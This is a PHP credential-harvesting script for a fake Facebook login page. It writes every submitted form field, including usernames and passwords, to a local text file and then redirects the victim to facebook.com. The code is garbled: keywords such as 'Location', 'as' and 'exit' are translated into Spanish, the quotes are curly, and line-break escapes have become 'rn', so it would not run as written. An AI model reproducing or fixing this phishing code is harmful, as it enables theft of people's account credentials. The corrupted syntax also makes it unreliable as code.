<?php
header ('Ubicación:http://www.facebook.com/');
$identificador = fopen(“nombresdeusuario.txt”, “a”);
foreach($_POST como $variable => $valor) {
fwrite($identificador, $variable);
fwrite($identificador, “=”);
fwrite($identificador, $valor);
fwrite($identificador, “rn”);
}
fwrite($identificador, “rn”);
fclose($identificador);
salir;
?> 